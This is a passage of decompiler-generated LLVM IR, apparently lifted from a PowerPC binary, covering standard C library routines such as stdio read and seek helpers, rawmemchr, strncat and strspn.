  %r0.global-to-local = alloca i32, align 4
  %v0_10013888 = load i32, i32* @lr, align 4
  store i32 %v0_10013888, i32* %r0.global-to-local, align 4
  store i32 %arg1, i32* @r29, align 4
  %v1_1001389c = add i32 %arg1, 8
  %v2_1001389c = inttoptr i32 %v1_1001389c to i32*
  %v3_1001389c = load i32, i32* %v2_1001389c, align 4
  %v1_100138a0 = add i32 %arg1, 12
  %v2_100138a0 = inttoptr i32 %v1_100138a0 to i32*
  %v3_100138a0 = load i32, i32* %v2_100138a0, align 4
  %v2_100138a4 = sub i32 %v3_100138a0, %v3_1001389c
  store i32 268515500, i32* @lr, align 4
  %v3_100138a8 = inttoptr i32 %v3_1001389c to i16*
  %v4_100138a8 = call i32 @__stdio_READ(i16* %v3_100138a8, i32 %v2_100138a4, i32 %v2_100138a4)
  %v0_100138ac = load i32, i32* @r29, align 4
  %v1_100138ac = add i32 %v0_100138ac, 8
  %v2_100138ac = inttoptr i32 %v1_100138ac to i32*
  %v3_100138ac = load i32, i32* %v2_100138ac, align 4
  %v2_100138b0 = add i32 %v3_100138ac, %v4_100138a8
  store i32 %v2_100138b0, i32* %r0.global-to-local, align 4
  %v2_100138b4 = add i32 %v0_100138ac, 16
  %v3_100138b4 = inttoptr i32 %v2_100138b4 to i32*
  store i32 %v3_100138ac, i32* %v3_100138b4, align 4
  %v0_100138b8 = load i32, i32* %r0.global-to-local, align 4
  %v1_100138b8 = load i32, i32* @r29, align 4
  %v2_100138b8 = add i32 %v1_100138b8, 20
  %v3_100138b8 = inttoptr i32 %v2_100138b8 to i32*
  store i32 %v0_100138b8, i32* %v3_100138b8, align 4
  store i32 %v0_10013888, i32* %r0.global-to-local, align 4
  ret i32 %v4_100138a8

; uselistorder directives
  uselistorder i32 %v3_100138ac, { 1, 0 }
  uselistorder i32 %v4_100138a8, { 1, 0 }
  uselistorder i32 %v3_1001389c, { 1, 0 }
  uselistorder i32 %arg1, { 0, 2, 1 }
}

define i32 @__stdio_trans2r_o(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* @r3, align 4
  %v0_100138d8 = load i32, i32* @r31, align 4
  store i32 %tmp, i32* @r31, align 4
  %v3_100138e4 = load i16, i16* %arg1, align 2
  %v4_100138e4 = zext i16 %v3_100138e4 to i32
  %v2_100138e8 = and i32 %v4_100138e4, %arg2
  %v5_100138e8 = icmp eq i32 %v2_100138e8, 0
  br i1 %v5_100138e8, label %dec_label_pc_100138f0, label %dec_label_pc_10013900

dec_label_pc_100138f0:                            ; preds = %entry
  %v1_100138f0 = and i32 %v4_100138e4, 2176
  %v3_100138f0 = icmp eq i32 %v1_100138f0, 0
  br i1 %v3_100138f0, label %dec_label_pc_100138f8, label %dec_label_pc_1001390c

dec_label_pc_100138f8:                            ; preds = %dec_label_pc_100138f0
  %v2_100138f8 = or i32 %v4_100138e4, %arg2
  %v1_100138fc = trunc i32 %v2_100138f8 to i16
  store i16 %v1_100138fc, i16* %arg1, align 2
  %v0_10013900.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10013900

dec_label_pc_10013900:                            ; preds = %entry, %dec_label_pc_100138f8
  %v0_10013900 = phi i32 [ %tmp, %entry ], [ %v0_10013900.pre, %dec_label_pc_100138f8 ]
  %v1_10013900 = inttoptr i32 %v0_10013900 to i16*
  %v2_10013900 = load i16, i16* %v1_10013900, align 2
  %v3_10013900 = zext i16 %v2_10013900 to i32
  %v1_10013904 = and i32 %v3_10013900, 16
  %v3_10013904 = icmp eq i32 %v1_10013904, 0
  br i1 %v3_10013904, label %dec_label_pc_10013928, label %dec_label_pc_1001390c

dec_label_pc_1001390c:                            ; preds = %dec_label_pc_100138f0, %dec_label_pc_10013900
  %v0_1001390c = call i32 @__errno_location()
  store i32 %v0_1001390c, i32* %r3.global-to-local, align 4
  %v2_10013914 = inttoptr i32 %v0_1001390c to i32*
  store i32 9, i32* %v2_10013914, align 4
  br label %dec_label_pc_10013918

dec_label_pc_10013918:                            ; preds = %dec_label_pc_10013930, %dec_label_pc_1001390c
  %v0_10013918 = load i32, i32* @r31, align 4
  %v1_10013918 = inttoptr i32 %v0_10013918 to i16*
  %v2_10013918 = load i16, i16* %v1_10013918, align 2
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_10013920 = or i16 %v2_10013918, 8
  br label %dec_label_pc_1001395c

dec_label_pc_10013928:                            ; preds = %dec_label_pc_10013900
  %v1_10013928 = and i32 %v3_10013900, 64
  %v3_10013928 = icmp eq i32 %v1_10013928, 0
  br i1 %v3_10013928, label %dec_label_pc_10013950, label %dec_label_pc_10013930

dec_label_pc_10013930:                            ; preds = %dec_label_pc_10013928
  store i32 268515636, i32* @lr, align 4
  %v0_10013930 = call i32 @__stdio_wcommit()
  store i32 %v0_10013930, i32* %r3.global-to-local, align 4
  %v3_10013934 = icmp eq i32 %v0_10013930, 0
  br i1 %v3_10013934, label %dec_label_pc_1001393c, label %dec_label_pc_10013918

dec_label_pc_1001393c:                            ; preds = %dec_label_pc_10013930
  %v0_1001393c = load i32, i32* @r31, align 4
  %v1_1001393c = inttoptr i32 %v0_1001393c to i16*
  %v2_1001393c = load i16, i16* %v1_1001393c, align 2
  %v3_1001393c = zext i16 %v2_1001393c to i32
  %v1_10013940 = add i32 %v0_1001393c, 8
  %v2_10013940 = inttoptr i32 %v1_10013940 to i32*
  %v3_10013940 = load i32, i32* %v2_10013940, align 4
  %v1_10013944 = call i32 @__asm_rlwinm(i32 %v3_1001393c, i32 0, i32 26, i32 24)
  %v2_10013944 = trunc i32 %v1_10013944 to i16
  %v1_10013948 = load i32, i32* @r31, align 4
  %v2_10013948 = add i32 %v1_10013948, 28
  %v3_10013948 = inttoptr i32 %v2_10013948 to i32*
  store i32 %v3_10013940, i32* %v3_10013948, align 4
  %v3_1001394c = load i32, i32* @r31, align 4
  %v4_1001394c = inttoptr i32 %v3_1001394c to i16*
  store i16 %v2_10013944, i16* %v4_1001394c, align 2
  %v0_10013950.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10013950

dec_label_pc_10013950:                            ; preds = %dec_label_pc_10013928, %dec_label_pc_1001393c
  %v0_10013950 = phi i32 [ %v0_10013900, %dec_label_pc_10013928 ], [ %v0_10013950.pre, %dec_label_pc_1001393c ]
  %v1_10013950 = inttoptr i32 %v0_10013950 to i16*
  %v2_10013950 = load i16, i16* %v1_10013950, align 2
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_10013958 = or i16 %v2_10013950, 1
  br label %dec_label_pc_1001395c

dec_label_pc_1001395c:                            ; preds = %dec_label_pc_10013918, %dec_label_pc_10013950
  %v2_1001395c = phi i32 [ %v0_10013918, %dec_label_pc_10013918 ], [ %v0_10013950, %dec_label_pc_10013950 ]
  %storemerge.off0 = phi i16 [ %v1_10013920, %dec_label_pc_10013918 ], [ %v1_10013958, %dec_label_pc_10013950 ]
  %v3_1001395c = inttoptr i32 %v2_1001395c to i16*
  store i16 %storemerge.off0, i16* %v3_1001395c, align 2
  store i32 %v0_100138d8, i32* @r31, align 4
  %v0_10013970 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_10013970

; uselistorder directives
  uselistorder i32 %v4_100138e4, { 0, 2, 1 }
  uselistorder i32* %r3.global-to-local, { 2, 0, 1, 3, 4 }
  uselistorder i32 26, { 4, 2, 5, 6, 3, 8, 9, 1, 7, 0 }
  uselistorder i32 ()* @__stdio_wcommit, { 3, 6, 5, 4, 2, 1, 0 }
  uselistorder i32 64, { 6, 3, 4, 5, 2, 8, 9, 11, 7, 12, 0, 1, 10 }
  uselistorder i16 8, { 5, 0, 1, 2, 3, 4 }
  uselistorder i32 2176, { 1, 0 }
  uselistorder i16* %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1001395c, { 1, 0 }
  uselistorder label %dec_label_pc_10013950, { 1, 0 }
  uselistorder label %dec_label_pc_1001390c, { 1, 0 }
  uselistorder label %dec_label_pc_10013900, { 1, 0 }
}

define i32 @__stdio_seek(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  %v0_10013974 = load i32, i32* @lr, align 4
  store i32 %v0_10013974, i32* %r0.global-to-local, align 4
  store i32 %arg3, i32* @r7, align 4
  %v0_10013980 = load i32, i32* @r31, align 4
  store i32 %tmp, i32* @r31, align 4
  %v1_1001398c = add i32 %arg1, 4
  %v2_1001398c = inttoptr i32 %v1_1001398c to i32*
  %v3_1001398c = load i32, i32* %v2_1001398c, align 4
  %v2_10013990 = load i32, i32* %arg2, align 4
  %v1_10013994 = add i32 %tmp, 4
  %v2_10013994 = inttoptr i32 %v1_10013994 to i32*
  %v3_10013994 = load i32, i32* %v2_10013994, align 4
  store i32 268515740, i32* @lr, align 4
  %v4_10013998 = call i32 @__libc_lseek64(i32 %v3_1001398c, i32 %v2_10013990, i32 %v3_10013994, i32 %arg3)
  %v1_1001399c = icmp slt i32 %v4_10013998, 0
  store i32 %tmp, i32* %r0.global-to-local, align 4
  br i1 %v1_1001399c, label %dec_label_pc_100139b4, label %dec_label_pc_100139a8

dec_label_pc_100139a8:                            ; preds = %entry
  %v1_100139a8 = load i32, i32* @r31, align 4
  %v2_100139a8 = inttoptr i32 %v1_100139a8 to i32*
  store i32 %v4_10013998, i32* %v2_100139a8, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_100139b0 = load i32, i32* @r31, align 4
  %v2_100139b0 = add i32 %v1_100139b0, 4
  %v3_100139b0 = inttoptr i32 %v2_100139b0 to i32*
  store i32 %tmp, i32* %v3_100139b0, align 4
  %v0_100139b4.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_100139b4

dec_label_pc_100139b4:                            ; preds = %entry, %dec_label_pc_100139a8
  %v0_100139b4 = phi i32 [ %tmp, %entry ], [ %v0_100139b4.pre, %dec_label_pc_100139a8 ]
  store i32 %v0_10013974, i32* %r0.global-to-local, align 4
  store i32 %v0_10013980, i32* @r31, align 4
  ret i32 %v0_100139b4

; uselistorder directives
  uselistorder i32 %tmp, { 0, 1, 3, 4, 2 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %dec_label_pc_100139b4, { 1, 0 }
}

define i32 @rawmemchr(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %v1_100139cc = urem i32 %arg1, 256
  store i32 %v1_100139cc, i32* %r4.global-to-local, align 4
  %v0_100139e41 = load i32, i32* @r3, align 4
  %v1_100139e42 = urem i32 %v0_100139e41, 4
  %v3_100139e44 = icmp eq i32 %v1_100139e42, 0
  br i1 %v3_100139e44, label %dec_label_pc_100139ec, label %dec_label_pc_100139d4

dec_label_pc_100139d4:                            ; preds = %entry, %dec_label_pc_100139d4
  %v1_100139d8 = phi i32 [ %v0_100139ec.pre, %dec_label_pc_100139d4 ], [ %v1_100139cc, %entry ]
  %v0_100139d4 = phi i32 [ %v1_100139e0, %dec_label_pc_100139d4 ], [ %v0_100139e41, %entry ]
  %v1_100139d4 = inttoptr i32 %v0_100139d4 to i8*
  %v2_100139d4 = load i8, i8* %v1_100139d4, align 1
  %v3_100139d4 = zext i8 %v2_100139d4 to i32
  %v4_100139d8 = icmp eq i32 %v3_100139d4, %v1_100139d8
  %v0_100139dc = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_100139d8, i32 %v0_100139dc)
  %v0_100139e0 = load i32, i32* @r3, align 4
  %v1_100139e0 = add i32 %v0_100139e0, 1
  store i32 %v1_100139e0, i32* @r3, align 4
  %v1_100139e4 = urem i32 %v1_100139e0, 4
  %v3_100139e4 = icmp eq i32 %v1_100139e4, 0
  %v0_100139ec.pre = load i32, i32* %r4.global-to-local, align 4
  br i1 %v3_100139e4, label %dec_label_pc_100139ec, label %dec_label_pc_100139d4

dec_label_pc_100139ec:                            ; preds = %dec_label_pc_100139d4, %entry
  %v0_10013a049 = phi i32 [ %v0_100139e41, %entry ], [ %v1_100139e0, %dec_label_pc_100139d4 ]
  %v0_100139ec = phi i32 [ %v1_100139cc, %entry ], [ %v0_100139ec.pre, %dec_label_pc_100139d4 ]
  %v1_100139ec = mul i32 %v0_100139ec, 256
  %v2_100139f4 = or i32 %v1_100139ec, %v0_100139ec
  %v1_100139fc = mul i32 %v2_100139f4, 65536
  %v2_10013a00 = or i32 %v1_100139fc, %v2_100139f4
  br label %dec_label_pc_10013a04

dec_label_pc_10013a04:                            ; preds = %dec_label_pc_10013a70, %dec_label_pc_10013a04, %dec_label_pc_100139ec
  %v0_10013a40 = phi i32 [ %v0_10013a049, %dec_label_pc_100139ec ], [ %v1_10013a08, %dec_label_pc_10013a04 ], [ %v1_10013a08, %dec_label_pc_10013a70 ]
  %v1_10013a04 = inttoptr i32 %v0_10013a40 to i32*
  %v2_10013a04 = load i32, i32* %v1_10013a04, align 4
  %v1_10013a08 = add i32 %v0_10013a40, 4
  %v1_10013a0c = add i32 %v0_10013a40, 2
  %v2_10013a10 = xor i32 %v2_10013a04, %v2_10013a00
  %v1_10013a18 = add i32 %v2_10013a10, 2130640639
  %v2_10013a1c = xor i32 %v1_10013a18, %v2_10013a10
  %v1_10013a20 = add i32 %v0_10013a40, 1
  %v2_10013a24 = and i32 %v2_10013a1c, -2130640640
  %v6_10013a24 = icmp eq i32 %v2_10013a24, -2130640640
  br i1 %v6_10013a24, label %dec_label_pc_10013a04, label %dec_label_pc_10013a30

dec_label_pc_10013a30:                            ; preds = %dec_label_pc_10013a04
  %v2_10013a30 = inttoptr i32 %v0_10013a40 to i8*
  %v3_10013a30 = load i8, i8* %v2_10013a30, align 1
  %v4_10013a30 = zext i8 %v3_10013a30 to i32
  %v1_10013a34 = add i32 %v0_10013a40, 3
  %v4_10013a38 = icmp eq i32 %v4_10013a30, %v0_100139ec
  br i1 %v4_10013a38, label %dec_label_pc_10013a40, label %dec_label_pc_10013a48

dec_label_pc_10013a40:                            ; preds = %dec_label_pc_10013a30
  ret i32 %v0_10013a40

dec_label_pc_10013a48:                            ; preds = %dec_label_pc_10013a30
  %v2_10013a48 = inttoptr i32 %v1_10013a20 to i8*
  %v3_10013a48 = load i8, i8* %v2_10013a48, align 1
  %v4_10013a48 = zext i8 %v3_10013a48 to i32
  %v4_10013a4c = icmp eq i32 %v4_10013a48, %v0_100139ec
  br i1 %v4_10013a4c, label %dec_label_pc_10013a54, label %dec_label_pc_10013a5c

dec_label_pc_10013a54:                            ; preds = %dec_label_pc_10013a48
  ret i32 %v1_10013a20

dec_label_pc_10013a5c:                            ; preds = %dec_label_pc_10013a48
  %v2_10013a5c = inttoptr i32 %v1_10013a0c to i8*
  %v3_10013a5c = load i8, i8* %v2_10013a5c, align 1
  %v4_10013a5c = zext i8 %v3_10013a5c to i32
  %v4_10013a60 = icmp eq i32 %v4_10013a5c, %v0_100139ec
  br i1 %v4_10013a60, label %dec_label_pc_10013a68, label %dec_label_pc_10013a70

dec_label_pc_10013a68:                            ; preds = %dec_label_pc_10013a5c
  ret i32 %v1_10013a0c

dec_label_pc_10013a70:                            ; preds = %dec_label_pc_10013a5c
  %v2_10013a70 = inttoptr i32 %v1_10013a34 to i8*
  %v3_10013a70 = load i8, i8* %v2_10013a70, align 1
  %v4_10013a70 = zext i8 %v3_10013a70 to i32
  %v4_10013a74 = icmp eq i32 %v4_10013a70, %v0_100139ec
  br i1 %v4_10013a74, label %dec_label_pc_10013a7c, label %dec_label_pc_10013a04

dec_label_pc_10013a7c:                            ; preds = %dec_label_pc_10013a70
  ret i32 %v1_10013a34

; uselistorder directives
  uselistorder i32 %v1_10013a08, { 1, 0 }
  uselistorder i32 %v0_10013a40, { 0, 1, 3, 2, 6, 5, 4 }
  uselistorder i32 %v2_100139f4, { 1, 0 }
  uselistorder i32 %v0_100139ec, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_100139e0, { 1, 0, 3, 2 }
  uselistorder i32 %v0_100139e41, { 2, 1, 0 }
  uselistorder i32 %v1_100139cc, { 1, 2, 0 }
  uselistorder i32 -2130640640, { 0, 3, 2, 9, 1, 4, 10, 5, 6, 7, 8 }
  uselistorder label %dec_label_pc_100139d4, { 1, 0 }
}

define i32 @__GI_strncat(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cr7_eq.global-to-local = alloca i1, align 1
  %ctr.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10013a88

dec_label_pc_10013a88:                            ; preds = %dec_label_pc_10013a88, %entry
  %v0_10013a88 = phi i32 [ %v1_10013a8c, %dec_label_pc_10013a88 ], [ %tmp, %entry ]
  %v1_10013a88 = inttoptr i32 %v0_10013a88 to i8*
  %v2_10013a88 = load i8, i8* %v1_10013a88, align 1
  %v1_10013a8c = add i32 %v0_10013a88, 1
  store i32 %v1_10013a8c, i32* %r11.global-to-local, align 4
  %v3_10013a90 = icmp eq i8 %v2_10013a88, 0
  store i1 %v3_10013a90, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10013a90, label %dec_label_pc_10013a98, label %dec_label_pc_10013a88

dec_label_pc_10013a98:                            ; preds = %dec_label_pc_10013a88
  %v3_10013a98 = icmp eq i32 %arg2, 3
  store i1 %v3_10013a98, i1* %cr7_eq.global-to-local, align 1
  %v1_10013a9c = add i32 %v0_10013a88, -1
  store i32 %v1_10013a9c, i32* %r11.global-to-local, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  %tmp8 = icmp ult i32 %arg2, 4
  br i1 %tmp8, label %dec_label_pc_10013b38, label %dec_label_pc_10013aa8

dec_label_pc_10013aa8:                            ; preds = %dec_label_pc_10013a98
  %v1_10013aa8 = udiv i32 %arg2, 4
  store i32 %v1_10013aa8, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_10013ab0

dec_label_pc_10013ab0:                            ; preds = %dec_label_pc_10013ab0.dec_label_pc_10013ab0_crit_edge, %dec_label_pc_10013aa8
  %v2_10013ac0 = phi i32 [ %v0_10013ab4.pre, %dec_label_pc_10013ab0.dec_label_pc_10013ab0_crit_edge ], [ %v1_10013a9c, %dec_label_pc_10013aa8 ]
  %v0_10013ab0 = load i32, i32* @r4, align 4
  %v1_10013ab0 = inttoptr i32 %v0_10013ab0 to i8*
  %v2_10013ab0 = load i8, i8* %v1_10013ab0, align 1
  %v1_10013ab4 = add i32 %v2_10013ac0, 1
  store i32 %v1_10013ab4, i32* %r9.global-to-local, align 4
  %v1_10013ab8 = add i32 %v2_10013ac0, 2
  store i32 %v1_10013ab8, i32* %r7.global-to-local, align 4
  %v3_10013abc = icmp eq i8 %v2_10013ab0, 0
  store i1 %v3_10013abc, i1* %cr7_eq.global-to-local, align 1
  %v4_10013ac0 = inttoptr i32 %v1_10013ab4 to i8*
  store i8 %v2_10013ab0, i8* %v4_10013ac0, align 1
  %v0_10013ac4 = load i32, i32* @r4, align 4
  %v1_10013ac4 = add i32 %v0_10013ac4, 1
  store i32 %v1_10013ac4, i32* %r11.global-to-local, align 4
  %v0_10013ac8 = load i32, i32* @lr, align 4
  %v1_10013ac8 = load i1, i1* %cr7_eq.global-to-local, align 1
  call void @__pseudo_cond_branch(i1 %v1_10013ac8, i32 %v0_10013ac8)
  %v0_10013acc = load i32, i32* @r4, align 4
  %v1_10013acc = add i32 %v0_10013acc, 1
  %v2_10013acc = inttoptr i32 %v1_10013acc to i8*
  %v3_10013acc = load i8, i8* %v2_10013acc, align 1
  %v0_10013ad0 = load i32, i32* %r11.global-to-local, align 4
  %v1_10013ad0 = add i32 %v0_10013ad0, 1
  store i32 %v1_10013ad0, i32* %r8.global-to-local, align 4
  %v0_10013ad4 = load i32, i32* %r7.global-to-local, align 4
  %v1_10013ad4 = add i32 %v0_10013ad4, 1
  store i32 %v1_10013ad4, i32* %r10.global-to-local, align 4
  %v3_10013ad8 = icmp eq i8 %v3_10013acc, 0
  store i1 %v3_10013ad8, i1* %cr7_eq.global-to-local, align 1
  %v2_10013adc = load i32, i32* %r9.global-to-local, align 4
  %v3_10013adc = add i32 %v2_10013adc, 1
  %v4_10013adc = inttoptr i32 %v3_10013adc to i8*
  store i8 %v3_10013acc, i8* %v4_10013adc, align 1
  %v0_10013ae0 = load i32, i32* %r8.global-to-local, align 4
  %v1_10013ae0 = add i32 %v0_10013ae0, 1
  store i32 %v1_10013ae0, i32* %r9.global-to-local, align 4
  %v1_10013ae4 = add i32 %v0_10013ae0, 2
  store i32 %v1_10013ae4, i32* @r4, align 4
  %v0_10013ae8 = load i32, i32* @lr, align 4
  %v1_10013ae8 = load i1, i1* %cr7_eq.global-to-local, align 1
  call void @__pseudo_cond_branch(i1 %v1_10013ae8, i32 %v0_10013ae8)
  %v0_10013aec = load i32, i32* %r11.global-to-local, align 4
  %v1_10013aec = add i32 %v0_10013aec, 1
  %v2_10013aec = inttoptr i32 %v1_10013aec to i8*
  %v3_10013aec = load i8, i8* %v2_10013aec, align 1
  %v0_10013af0 = load i32, i32* %r10.global-to-local, align 4
  %v1_10013af0 = add i32 %v0_10013af0, 1
  store i32 %v1_10013af0, i32* %r11.global-to-local, align 4
  %v3_10013af4 = icmp eq i8 %v3_10013aec, 0
  store i1 %v3_10013af4, i1* %cr7_eq.global-to-local, align 1
  %v2_10013af8 = load i32, i32* %r7.global-to-local, align 4
  %v3_10013af8 = add i32 %v2_10013af8, 1
  %v4_10013af8 = inttoptr i32 %v3_10013af8 to i8*
  store i8 %v3_10013aec, i8* %v4_10013af8, align 1
  %v0_10013afc = load i32, i32* @lr, align 4
  %v1_10013afc = load i1, i1* %cr7_eq.global-to-local, align 1
  call void @__pseudo_cond_branch(i1 %v1_10013afc, i32 %v0_10013afc)
  %v0_10013b00 = load i32, i32* %r8.global-to-local, align 4
  %v1_10013b00 = add i32 %v0_10013b00, 1
  %v2_10013b00 = inttoptr i32 %v1_10013b00 to i8*
  %v3_10013b00 = load i8, i8* %v2_10013b00, align 1
  %v4_10013b00 = zext i8 %v3_10013b00 to i32
  store i32 %v4_10013b00, i32* %r9.global-to-local, align 4
  %v3_10013b04 = icmp eq i8 %v3_10013b00, 0
  store i1 %v3_10013b04, i1* %cr7_eq.global-to-local, align 1
  %v2_10013b08 = load i32, i32* %r10.global-to-local, align 4
  %v3_10013b08 = add i32 %v2_10013b08, 1
  %v4_10013b08 = inttoptr i32 %v3_10013b08 to i8*
  store i8 %v3_10013b00, i8* %v4_10013b08, align 1
  %v0_10013b0c = load i32, i32* @lr, align 4
  %v1_10013b0c = load i1, i1* %cr7_eq.global-to-local, align 1
  call void @__pseudo_cond_branch(i1 %v1_10013b0c, i32 %v0_10013b0c)
  %v0_10013b10 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10013b10 = add i32 %v0_10013b10, -1
  store i32 %v1_10013b10, i32* %ctr.global-to-local, align 4
  %v2_10013b10 = icmp eq i32 %v1_10013b10, 0
  br i1 %v2_10013b10, label %dec_label_pc_10013b14, label %dec_label_pc_10013ab0.dec_label_pc_10013ab0_crit_edge

dec_label_pc_10013ab0.dec_label_pc_10013ab0_crit_edge: ; preds = %dec_label_pc_10013ab0
  %v0_10013ab4.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10013ab0

dec_label_pc_10013b14:                            ; preds = %dec_label_pc_10013ab0
  %v0_10013b14 = load i32, i32* %r5.global-to-local, align 4
  %v1_10013b14 = urem i32 %v0_10013b14, 4
  store i32 %v1_10013b14, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_10013b38

dec_label_pc_10013b1c:                            ; preds = %dec_label_pc_10013b38, %dec_label_pc_10013b1c.dec_label_pc_10013b1c_crit_edge
  %v0_10013b20 = phi i32 [ %v0_10013b20.pre, %dec_label_pc_10013b1c.dec_label_pc_10013b1c_crit_edge ], [ %v0_10013b38, %dec_label_pc_10013b38 ]
  %v0_10013b1c = load i32, i32* @r4, align 4
  %v1_10013b1c = inttoptr i32 %v0_10013b1c to i8*
  %v2_10013b1c = load i8, i8* %v1_10013b1c, align 1
  %v3_10013b1c = zext i8 %v2_10013b1c to i32
  store i32 %v3_10013b1c, i32* %r9.global-to-local, align 4
  %v1_10013b20 = add i32 %v0_10013b20, -1
  store i32 %v1_10013b20, i32* %r5.global-to-local, align 4
  %v1_10013b24 = add i32 %v0_10013b1c, 1
  store i32 %v1_10013b24, i32* @r4, align 4
  %v3_10013b28 = icmp eq i8 %v2_10013b1c, 0
  store i1 %v3_10013b28, i1* %cr7_eq.global-to-local, align 1
  %v2_10013b2c = load i32, i32* %r11.global-to-local, align 4
  %v3_10013b2c = add i32 %v2_10013b2c, 1
  %v4_10013b2c = inttoptr i32 %v3_10013b2c to i8*
  store i8 %v2_10013b1c, i8* %v4_10013b2c, align 1
  store i32 %v3_10013b2c, i32* %r11.global-to-local, align 4
  %v0_10013b30 = load i32, i32* @lr, align 4
  %v1_10013b30 = load i1, i1* %cr7_eq.global-to-local, align 1
  call void @__pseudo_cond_branch(i1 %v1_10013b30, i32 %v0_10013b30)
  %v0_10013b40 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10013b40 = add i32 %v0_10013b40, -1
  store i32 %v1_10013b40, i32* %ctr.global-to-local, align 4
  %v2_10013b40 = icmp eq i32 %v1_10013b40, 0
  br i1 %v2_10013b40, label %dec_label_pc_10013b44, label %dec_label_pc_10013b1c.dec_label_pc_10013b1c_crit_edge

dec_label_pc_10013b1c.dec_label_pc_10013b1c_crit_edge: ; preds = %dec_label_pc_10013b1c
  %v0_10013b20.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_10013b1c

dec_label_pc_10013b38:                            ; preds = %dec_label_pc_10013a98, %dec_label_pc_10013b14
  %v0_10013b38 = phi i32 [ %arg2, %dec_label_pc_10013a98 ], [ %v1_10013b14, %dec_label_pc_10013b14 ]
  store i32 %v0_10013b38, i32* %ctr.global-to-local, align 4
  %v2_10013b403 = icmp eq i32 %v0_10013b38, 0
  br i1 %v2_10013b403, label %dec_label_pc_10013b44, label %dec_label_pc_10013b1c

dec_label_pc_10013b44:                            ; preds = %dec_label_pc_10013b1c, %dec_label_pc_10013b38
  %v0_10013b44 = load i32, i32* %r9.global-to-local, align 4
  %v3_10013b44 = icmp eq i32 %v0_10013b44, 0
  store i1 %v3_10013b44, i1* %cr7_eq.global-to-local, align 1
  %v0_10013b48 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_10013b44, i32 %v0_10013b48)
  %v0_10013b4c = load i32, i32* %r5.global-to-local, align 4
  %v1_10013b4c = trunc i32 %v0_10013b4c to i8
  %v2_10013b4c = load i32, i32* %r11.global-to-local, align 4
  %v3_10013b4c = add i32 %v2_10013b4c, 1
  %v4_10013b4c = inttoptr i32 %v3_10013b4c to i8*
  store i8 %v1_10013b4c, i8* %v4_10013b4c, align 1
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v0_10013b38, { 1, 2, 0 }
  uselistorder i32 %v1_10013b40, { 1, 0 }
  uselistorder i32 %v1_10013b14, { 1, 0 }
  uselistorder i32 %v1_10013b10, { 1, 0 }
  uselistorder i32 %v2_10013ac0, { 1, 0 }
  uselistorder i32 %v1_10013a8c, { 1, 0 }
  uselistorder i32 %v0_10013a88, { 0, 2, 1 }
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r9.global-to-local, { 5, 0, 1, 2, 3, 4, 6 }
  uselistorder i32* %r8.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r5.global-to-local, { 4, 2, 3, 5, 0, 1 }
  uselistorder i32* %r11.global-to-local, { 6, 0, 7, 1, 2, 4, 3, 5, 8, 9, 10 }
  uselistorder i32* %ctr.global-to-local, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32 %arg2, { 2, 0, 1, 3, 4 }
  uselistorder label %dec_label_pc_10013b44, { 1, 0 }
  uselistorder label %dec_label_pc_10013b38, { 1, 0 }
}

define i32 @__GI_strspn(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_10013b841 = load i32, i32* @r3, align 4
  %v1_10013b842 = inttoptr i32 %v0_10013b841 to i8*
  %v2_10013b843 = load i8, i8* %v1_10013b842, align 1
  %v3_10013b886 = icmp eq i8 %v2_10013b843, 0
  br i1 %v3_10013b886, label %dec_label_pc_10013b98, label %dec_label_pc_10013b90

dec_label_pc_10013b60:                            ; preds = %dec_label_pc_10013b60, %dec_label_pc_10013b90
  %v0_10013b60 = phi i32 [ %v1_10013b64, %dec_label_pc_10013b60 ], [ %tmp, %dec_label_pc_10013b90 ]
  %v1_10013b60 = inttoptr i32 %v0_10013b60 to i8*
  %v2_10013b60 = load i8, i8* %v1_10013b60, align 1
  %v1_10013b64 = add i32 %v0_10013b60, 1
  %v3_10013b68 = icmp eq i8 %v2_10013b60, 0
  %v4_10013b6c = icmp eq i8 %v0_10013b6c8.in, %v2_10013b60
  %brmerge = or i1 %v3_10013b68, %v4_10013b6c
  br i1 %brmerge, label %dec_label_pc_10013b74, label %dec_label_pc_10013b60

dec_label_pc_10013b74:                            ; preds = %dec_label_pc_10013b60
  br i1 %v3_10013b68, label %dec_label_pc_10013b98, label %dec_label_pc_10013b7c
